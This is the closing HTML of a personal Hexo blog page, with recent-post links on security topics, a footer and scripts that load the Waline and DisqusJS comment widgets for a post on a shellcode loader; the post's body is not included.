title="研究生三年我都做了什么">研究生三年我都做了什么</a><time datetime="2025-03-25T15:24:58.000Z" title="发表于 2025-03-25 23:24:58">2025-03-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/hello-world.html" title="Hello World">Hello World</a><time datetime="2024-06-23T08:27:53.056Z" title="发表于 2024-06-23 16:27:53">2024-06-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/StackAndFuncCall.html" title="栈和函数调用(详细版)">栈和函数调用(详细版)</a><time datetime="2022-09-23T16:04:28.000Z" title="发表于 2022-09-24 00:04:28">2022-09-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/ssh-tunnel.html" title="搭建SSH隧道绕过防火墙">搭建SSH隧道绕过防火墙</a><time datetime="2022-08-04T19:12:40.000Z" title="发表于 2022-08-05 03:12:40">2022-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/sqli-summary.html" title="SQL注入总结">SQL注入总结</a><time datetime="2022-06-30T14:38:51.000Z" title="发表于 2022-06-30 22:38:51">2022-06-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328215223222.png)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2025 By LuckyFuture</div><div class="framework-info"><span>Powered by </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">本站部署在<a target="_blank" rel="noopener" href="https://pages.github.com/">GitHub Pages</a>，由<a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">jsDelivr</a>和<a target="_blank" rel="noopener" href="https://www.cloudflare.com/zh-cn/">CloudFlare</a>提供CDN加速和安全防护</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadWaline () {
+  function initWaline () {
+    let initData = {
+      el: '#waline-wrap',
+      serverURL: 'https://hexo-comments.vercel.app/',
+      avatar: 'mp',
+      path: location.pathname,
+      emojiCDN: '',
+      emojiMaps: "",
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    const waline = new Waline(initData)
+  }
+
+  if (typeof Waline === 'function') initWaline() 
+  else getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js').then(initWaline)
+}
+
+if ('Waline' === 'Waline' || !false) {
+  if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+  else setTimeout(loadWaline, 0)
+} else {
+  function loadOtherComment () {
+    loadWaline()
+  }
+}</script><script>function loadDisqusjs () {
+  function addDisqusjsCSS () {
+    const ele = document.createElement('link')
+    ele.rel = 'stylesheet'
+    ele.href= 'https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css'
+    document.getElementsByTagName('head')[0].appendChild(ele)
+  }
+
+  function initDisqusjs () {
+    window.DISQUS = null
+    new DisqusJS({
+      shortname: 'luckyfuture',
+      siteName: '',
+      identifier: 'BypassAVLearning4.html',
+      url: 'http://luckyfuture.top/BypassAVLearning4.html',
+      title: '从0开始写ShellCode加载器0x4-隐藏导入表',
+      api: 'https://disqus.skk.moe/disqus/',
+      apikey: 'zkchdXXUQFql5yBCEoFFYVoGrCrqnkDmWuirRxGPu6qmzj0i8lHYLa2HiWNus9DQ',
+      nocomment: '',
+      admin: 'LuckyFuture',
+      adminLabel: ''
+    });
+  }
+
+  window.disqusReset = initDisqusjs
+
+  if (window.disqusJsLoad) initDisqusjs()
+  else {
+    addDisqusjsCSS()
+    getScript('https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js').then(initDisqusjs)
+    window.disqusJsLoad = true
+  }
+}
+
+if ('Waline' === 'Disqusjs' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqusjs)
+  else loadDisqusjs()
+}
+else {
+  function loadOtherComment () {
+    loadDisqusjs()
+  }
+}
+
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script></div></body></html>
